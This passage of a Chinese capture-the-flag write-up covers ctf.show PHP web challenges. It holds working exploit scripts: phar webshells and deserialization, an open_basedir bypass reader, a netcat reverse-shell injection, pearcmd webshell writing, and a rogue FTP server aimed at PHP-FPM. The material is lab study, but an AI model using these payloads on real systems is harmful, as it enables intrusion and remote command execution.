num = None
if num is None:
   h.update(b'pinsalt')
   num = ('%09d' % int(h.hexdigest(), 16))[:9]
 
rv =None
if rv is None:
   for group_size in 5, 4, 3:
       if len(num) % group_size == 0:
          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                      for x in range(0, len(num), group_size))
          break
       else:
          rv = num
 
print(rv)
```

### web803（phar文件包含）

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file.'.txt')){
        include $file.'.txt';
    }else{
        file_put_contents($file,$content);
    }
}
```

web目录下没有写入权限，我们把文件写到/tmp

首先生成phar文件

```php
<?php
$phar=new Phar("shell.phar");
$phar->startBuffering();
$phar->setStub('GIF89a'.'<?php __HALT_COMPILER();?>');//she
$phar->addFromString("a.txt","<?php eval(\$_POST[1]);?>");//向phar归档添加一个名为a.txt的文件
$phar->stopBuffering();
?>
```

上传文件

```python
import requests
url="http://a8583eec-c5db-4611-8d57-4ec758fccdaf.challenge.ctf.show/"
data1={'file':'/tmp/a.phar','content':open('shell.phar','rb').read()}
data2={'file':'phar:///tmp/a.phar/a','content':'123','1':'system("cat f*");'}
requests.post(url,data=data1)
r=requests.post(url,data=data2)
print(r.text)
```

### web804（phar反序列化）

```php
<?php
 
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 
 
error_reporting(0);
highlight_file(__FILE__);
 
class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}
 
$file = $_POST['file'];
$content = $_POST['content'];
 
if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file)){
        unlink($file);
    }else{
        file_put_contents($file,$content);
    }
}
```

生成phar文件

```php
<?php
class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}
$a=new hacker();
$a->code="system('cat f*');";
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar->setMetadata($a);
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("suny", "111");
$phar->stopBuffering();
?>
```

unlink触发反序列化

```python
import requests  
url="http://112652d8-c72f-41ce-a972-a1a5896de5b7.challenge.ctf.show/"
data1={'file':'/tmp/a.phar','content':open('shell.phar','rb').read()}
data2={'file':'phar:///tmp/a.phar','content':'123'}
requests.post(url,data=data1)
r=requests.post(url,data=data2)
print(r.text)
```

### web805（绕过open_basedir）

先看一眼phpinfo

![image-20260327195042484](https://gitee.com/bobrocket/img/raw/master/image-20260327195042484.png)

![image-20260327195100763](https://gitee.com/bobrocket/img/raw/master/image-20260327195100763.png)

那么我们读文件可以用readfile或者file_get_contents，关键在于如何读目录？

#### 方法一

用蚁剑连接，终端直接能读flag（不知道为什么）

或者用蚁剑上的绕过插件也可以

![image-20260327193312681](https://gitee.com/bobrocket/img/raw/master/image-20260327193312681.png)

#### 方法二

`DirectoryIterator` 类提供了一个简单的界面来查看文件系统目录的内容。

DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。
DirectoryIterator与glob://结合将无视open_basedir，列举出根目录下的文件

```php
<?php
$c = "glob:///*";
$a = new DirectoryIterator($c);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```

![image-20260327195735254](https://gitee.com/bobrocket/img/raw/master/image-20260327195735254.png)

#### 方法三

利用 opendir()+readdir()+glob://

`opendir`作用为打开目录句柄
`readdir`作用为从目录句柄中读取目录

[从0学习bypass open_basedir姿势-先知社区](https://xz.aliyun.com/news/9520)

附一个P神的读文件脚本

```php
<?php
/*
* by phithon
* From https://www.leavesongs.com
* detail: http://cxsecurity.com/issue/WLB-2009110068
*/
header('content-type: text/plain');
error_reporting(-1);
ini_set('display_errors', TRUE);
printf("open_basedir: %s\nphp_version: %s\n", ini_get('open_basedir'), phpversion());
printf("disable_functions: %s\n", ini_get('disable_functions'));
$file = str_replace('\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');
$relat_file = getRelativePath(__FILE__, $file);
$paths = explode('/', $file);
$name = mt_rand() % 999;
$exp = getRandStr();
mkdir($name);
chdir($name);
for($i = 1 ; $i < count($paths) - 1 ; $i++){
    mkdir($paths[$i]);
    chdir($paths[$i]);
}
mkdir($paths[$i]);
for ($i -= 1; $i > 0; $i--) { 
    chdir('..');
}
$paths = explode('/', $relat_file);
$j = 0;
for ($i = 0; $paths[$i] == '..'; $i++) { 
    mkdir($name);
    chdir($name);
    $j++;
}
for ($i = 0; $i <= $j; $i++) { 
    chdir('..');
}
$tmp = array_fill(0, $j + 1, $name);
symlink(implode('/', $tmp), 'tmplink');
$tmp = array_fill(0, $j, '..');
symlink('tmplink/' . implode('/', $tmp) . $file, $exp);
unlink('tmplink');
mkdir('tmplink');
delfile($name);
$exp = dirname($_SERVER['SCRIPT_NAME']) . "/{$exp}";
$exp = "http://{$_SERVER['SERVER_NAME']}{$exp}";
echo "\n-----------------content---------------\n\n";
echo file_get_contents($exp);
delfile('tmplink');
 
function getRelativePath($from, $to) {
  // some compatibility fixes for Windows paths
  $from = rtrim($from, '\/') . '/';
  $from = str_replace('\\', '/', $from);
  $to   = str_replace('\\', '/', $to);
 
  $from   = explode('/', $from);
  $to     = explode('/', $to);
  $relPath  = $to;
 
  foreach($from as $depth => $dir) {
    // find first non-matching dir
    if($dir === $to[$depth]) {
      // ignore this directory
      array_shift($relPath);
    } else {
      // get number of remaining dirs to $from
      $remaining = count($from) - $depth;
      if($remaining > 1) {
        // add traversals up to first matching dir
        $padLength = (count($relPath) + $remaining - 1) * -1;
        $relPath = array_pad($relPath, $padLength, '..');
        break;
      } else {
        $relPath[0] = './' . $relPath[0];
      }
    }
  }
  return implode('/', $relPath);
}
 
function delfile($deldir){
    if (@is_file($deldir)) {
        @chmod($deldir,0777);
        return @unlink($deldir);
    }else if(@is_dir($deldir)){
        if(($mydir = @opendir($deldir)) == NULL) return false;
        while(false !== ($file = @readdir($mydir)))
        {
            $name = File_Str($deldir.'/'.$file);
            if(($file!='.') && ($file!='..')){delfile($name);}
        } 
        @closedir($mydir);
        @chmod($deldir,0777);
        return @rmdir($deldir) ? true : false;
    }
}
 
function File_Str($string)
{
    return str_replace('//','/',str_replace('\\','/',$string));
}
 
function getRandStr($length = 6) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $randStr = '';
    for ($i = 0; $i < $length; $i++) {
        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
    }
    return $randStr;
}
```

### web807（反弹shell）

```
/?url=https://;nc xxx.xxx.xxx.xxx:7777 -e /bin/sh
```

### web808（卡临时文件包含）

```php
<?php
error_reporting(0);
$file = $_GET['file'];
if(isset($file) && !preg_match("/input|data|phar|log/i",$file)){
    include $file;
}else{
    show_source(__FILE__);
    print_r(scandir("/tmp"));
}
```



```python
import requests 
import re 
url = "http://c234afb2-f2bc-4dc6-87c8-0e9022ef5953.challenge.ctf.show/"
file={
	'file':'<?php system("cat /*");?>'
}
requests.post(url+'?file=php://filter/string.strip_tags/resource=/etc/passwd',files=file)
r=requests.get(url)
#print(r.text)
tmp=re.findall('=> (php.*?)\\n',r.text,re.S)[-1]
r=requests.get(url+'?file=/tmp/'+tmp)
print(r.text)
```

### web809（pear文件包含/RCE）

```php
<?php
error_reporting(0);
$file = $_GET['file'];
if(isset($file) && !preg_match("/input|data|phar|log|filter/i",$file)){
    include $file;
}else{
    show_source(__FILE__);
    if(isset($_GET['info'])){
        phpinfo();
    }
}
```

首先我们读phpinfo看一下，`allow_url_include Off`而且过滤了filter链，只能打pearcmd

如果开启了`register_argc_argv`这个配置，我们在php中传入的query-string会被赋值给`$_SERVER['argv']`。而pear可以通过readPHPArgv()函数获得我们传入的`$_SERVER['argv']`，需要注意的是这个数字中的值是通过传进来内容中的`+`来进行分割的

在Docker环境中，pcel和pear都会默认安装

```
/index.php?&file=/usr/local/lib/php/pearcmd.php&/+config-create+/<?=eval($_POST[0])?>+/var/www/html/2.php
```

这里需要注意两点

- 必须用bp发包，直接用浏览器会url编码php标签
- `/+config-create+/<?=eval($_POST[0])?>+/var/www/html/2.php`这部分必须放在最后一个参数

### web810（SSRF打PHP-FPM（FastCGI））

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$url=$_GET['url'];
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_HEADER,1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,0);
curl_setopt($ch,CURLOPT_FOLLOWLOCATION,0);
$res=curl_exec($ch);
curl_close($ch);
```

![image-20260416165907739](https://gitee.com/bobrocket/img/raw/master/image-20260416165907739.png)

这里如果直接用浏览器传参的话注意要把_后面的内容进行url编码

![image-20260416170027002](https://gitee.com/bobrocket/img/raw/master/image-20260416170027002.png)

### web811（file_put_contents打PHP-FPM）

```php
<?php
error_reporting(0);
highlight_file(__FILE__);


$file = $_GET['file'];
$content = $_GET['content'];

file_put_contents($file, $content);
```

我们先来看一下原理

```php
<?php
$contents = file_get_contents($_GET['viewFile']);
file_put_contents($_GET['viewFile'], $contents);
```

#### 第一阶段：读取（file_get_contents）

当你访问 `?viewFile=ftp://evil-server/file.txt` 时：

1. `file_get_contents` 连接你的 Python 脚本（伪造的 FTP）。
2. Python 脚本发送 `227 Entering Passive Mode (127,0,0,1,0,9000)`。
3. **关键点：** PHP 此时会尝试从 `127.0.0.1:9000` 读取内容。由于 FPM 不是真正的 FTP 服务，它不会理会这个连接，或者返回报错，导致 `$contents` 变量拿到的数据可能为空或报错信息。

#### 第二阶段：写回（file_put_contents）—— 真正触发攻击

接下来的代码执行 `file_put_contents('ftp://...', $contents)`：

1. PHP 再次连接你的恶意 FTP，准备“上传” `$contents`。
2. 你的 Python 脚本再次回应：`227 Entering Passive Mode (127,0,0,1,0,9000)`。
3. **攻击发生：** PHP 认为它正在往 FTP 服务器上传文件，实际上它正在把 `$contents` 里的数据**发送到本地 9000 端口的 PHP-FPM**。

---

也就是说只要我们搭建一个恶意的ftp，并把content设定成打php-fpm即可

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0',23)) #端口可改
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

用gopherus工具生成一下payload，将数据外带

![image-20260416172806626](https://gitee.com/bobrocket/img/raw/master/image-20260416172806626.png)

只要gophe://127.0.0.0:9000_后面的内容

```
/?file=ftp://183.66.27.22:18546/test&content=xxx
```

![image-20260416100513451](https://gitee.com/bobrocket/img/raw/master/image-20260416100513451.png)

#### 注意

![image-20260416173130990](https://gitee.com/bobrocket/img/raw/master/image-20260416173130990.png)

### web813（劫持mysqli）



### web820（非常规文件上传）

查看源代码，我们找到一个upload.php

```php
<?php
error_reporting(0);

if(strlen($_FILES['file']['tmp_name'])>0){
    $filetype = $_FILES['file']['type'];
    $tmpname = $_FILES['file']['tmp_name'];
    $ef = getimagesize($tmpname);

    if( ($filetype=="image/jpeg") && ($ef!=false) && ($ef['mime']=='image/jpeg')){
        $content = base64_decode(file_get_contents($tmpname));
        file_put_contents("shell.php", $content);
        echo "file upload success!";
    }
}else{
    highlight_file(__FILE__);
}
```

我们发现会把图片内容进行base64解密然后写入shell.php，我们在图片后面写入base64加密的一句话木马，而在base64中是4位4位进行解码的，所以可能需要进行补位。但是不会超过4，所以就一位一位来试就可以了。

![image-20260418120245753](https://gitee.com/bobrocket/img/raw/master/image-20260418120245753.png)

